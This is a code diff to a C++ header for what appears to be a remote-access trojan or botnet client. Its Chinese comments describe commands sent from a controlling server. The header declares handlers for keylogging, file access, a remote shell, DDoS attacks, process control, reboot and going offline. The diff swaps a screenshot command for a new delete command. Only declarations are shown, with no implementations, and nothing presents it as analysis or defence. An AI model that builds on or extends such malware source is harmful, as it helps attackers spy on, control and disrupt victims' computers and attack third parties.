@@ -8,6 +8,7 @@
 #include "File.h"
 #include "Proc.h"
 #include "Ddos.h"
+#include "Delete.h"
 #include <string>
 #include <map>
 #include <vector>
@@ -21,7 +22,7 @@ public:
 
 	//-------------------------------------------------------------------------------
 	// 服务端向客户端发送的指令
-	std::string CmdSnapshoot;
+	std::string CmdDelete;
 	std::string CmdKeybd;
 	std::string CmdFile;
 	std::string CmdShell;
@@ -57,14 +58,14 @@ private:
 	std::map<std::string, std::string> parseArgs(std::string& data); // 解析参数
 
 	// 各个指令的处理函数
-	void doSnapshoot(std::map<std::string, std::string>& args);
+	void doDelete();
 	void doKeybd(std::map<std::string, std::string>& args);
 	void doFile(std::map<std::string, std::string>& args);
 	void doShell(std::map<std::string, std::string>& args);
 	void doDdos(std::map<std::string, std::string>& args);
 	void doSendBox(std::map<std::string, std::string>& args);
-	void doReboot(std::map<std::string, std::string>& args);
-	void doOffline(std::map<std::string, std::string>& args);
+	void doReboot();
+	void doOffline();
 	void doProc(std::map<std::string, std::string>& args);
 };
 
